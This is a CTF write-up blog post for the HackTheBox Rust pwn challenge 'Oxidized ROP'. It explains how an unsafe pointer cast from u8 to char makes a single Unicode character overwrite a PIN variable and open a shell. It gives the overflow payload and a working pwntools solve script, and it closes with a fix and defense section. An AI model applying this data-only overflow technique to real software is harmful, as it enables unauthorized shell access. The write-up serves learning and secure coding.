---
layout: post
title: "HTB Challenge: Oxidized ROP"
date: 2027-06-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, rust, type-confusion, buffer-overflow, cwe-843, cwe-787, unsafe-rust, data-only-exploit]
---

A Rust pwn challenge where the name "ROP" is a red herring. No gadgets, no return-oriented programming — just a four-byte type confusion in unsafe Rust that lets a single Unicode character overwrite an adjacent stack variable and unlock a shell.

## Overview

**Oxidized ROP** is an Easy Pwn challenge. You get a Rust binary (`oxidized-rop`) and its source (`oxidized-rop.rs`). The binary presents a menu: fill in a survey, visit a config panel (PIN-locked), or exit. The vulnerability is in the survey's `save_data()` function — a [type confusion](https://cwe.mitre.org/data/definitions/843.html) caused by casting a byte-buffer pointer to a `char` pointer in an `unsafe` block, causing every write to advance four bytes instead of one.

## The technique

Rust's `char` type is not a C `char`. It stores a Unicode scalar value as a 32-bit integer — four bytes on all platforms. When you cast a `*mut u8` to `*mut char` and call `dest_ptr.write(c)`, you write **four bytes** and `dest_ptr.offset(1)` advances the pointer by **four bytes**, regardless of the underlying array's declared element size.

The length guard in `save_data()` uses `src.chars().count()`, which counts Unicode codepoints — not bytes. So a 103-character input passes the `> 200` check, but writes `103 × 4 = 412 bytes` into a `[u8; 200]` array, silently overflowing it by 212 bytes.

```rust
fn save_data(dest: &mut [u8], src: &String) {
    if src.chars().count() > INPUT_SIZE {   // counts chars, not bytes
        std::process::exit(1);
    }
    let mut dest_ptr = dest.as_mut_ptr() as *mut char;  // u8* → char* (4 bytes each)
    unsafe {
        for c in src.chars() {
            dest_ptr.write(c);              // writes 4 bytes
            dest_ptr = dest_ptr.offset(1); // advances 4 bytes
        }
    }
}
```

The stack layout in `main()` — read from the disassembly — puts `feedback.statement` at `rsp+0x10` (200 bytes) and `login_pin: u32` at `rsp+0x1a8`. The gap is `0x1a8 − 0x10 = 0x198 = 408 bytes`. At four bytes per write, exactly `408 / 4 = 102` filler characters fill that gap; the 103rd character lands precisely on `login_pin`.

The config panel check is `if *pin != 123456`. We need to write the value `123456 = 0x0001E240` onto `login_pin`. Unicode scalar U+1E240 has that exact code-point value. Written as a little-endian `u32` in memory it becomes the bytes `[0x40, 0xE2, 0x01, 0x00]`, which read back as `0x0001E240 = 123456`. One non-ASCII character is all it takes.

This is a pure [data-only attack](https://cwe.mitre.org/data/definitions/787.html) — no code pointer is ever touched, making the binary's PIE base randomisation and NX stack entirely irrelevant.

## Solution

**Step 1 — Choose option 1 (Survey) and send the payload:**

```
102 × 'A' + chr(123456)    ← 103 chars total, passes the ≤ 200 char check
```

Each `'A'` writes `[0x41, 0x00, 0x00, 0x00]` advancing four bytes; `chr(123456)` writes `[0x40, 0xE2, 0x01, 0x00]` to the four bytes that are `login_pin`.

**Step 2 — Choose option 2 (Config Panel):**

`login_pin` is now `123456`. The check `*pin != 123456` is false, so `present_config_panel()` proceeds past the guard and spawns `/bin/sh` via `process::Command::new("/bin/sh")`.

**Step 3 — Read the flag:**

```bash
cat /flag*
```

The working solve script:

```python
#!/usr/bin/env python3
from pwn import *
import sys

def exploit(host, port):
    io = remote(host, port) if host else process('./oxidized-rop')

    io.sendlineafter(b'Selection: ', b'1')

    payload = 'A' * 102 + chr(123456)
    io.sendlineafter(b'Statement (max 200 characters): ', payload.encode('utf-8'))

    io.sendlineafter(b'Selection: ', b'2')
    io.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 2:
        h, p = sys.argv[1].split(':')
        exploit(h, int(p))
    else:
        exploit(None, None)
```

```bash
python3 solve.py <docker_ip>:<docker_port>
```

Flag: `HTB{...}`

## Why it worked

The Rust `unsafe` block broke the compiler's aliasing guarantee. Outside `unsafe`, Rust would never allow `&mut [u8]` to be treated as `*mut char` — the type system encodes the element width. Inside `unsafe`, that guarantee is the programmer's responsibility, and here the programmer preserved the address but discarded the width. The `chars().count()` length check was the second failure: it validated the *number of codepoints*, which matched the programmer's mental model of "200 characters", but not the *number of bytes* that would be written.

The exploit required no leak, no brute-force, and no gadget chain. Finding the right `chr()` value is straightforward: read `login_pin`'s initialiser from the source or disassembly, confirm the value is a valid Unicode scalar (in `0x0..=0x10FFFF`, outside the surrogate range `0xD800–0xDFFF`), and use it directly.

## Fix / defense

- Replace the pointer cast with a safe write: `dest[i] = byte` or `dest.copy_from_slice(src.as_bytes())`.
- Validate the **byte length** of the source, not the character count: `if src.len() > INPUT_SIZE`.
- Keep `unsafe` blocks as small as possible and document the invariant each one relies on — the comment here should have said "each element is one byte wide", which would have flagged the cast immediately.
- Run `cargo clippy` with `clippy::transmute_ptr_to_ptr` and related lints enabled; AddressSanitizer (`-Zsanitizer=address`) would have caught the [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) at test time.
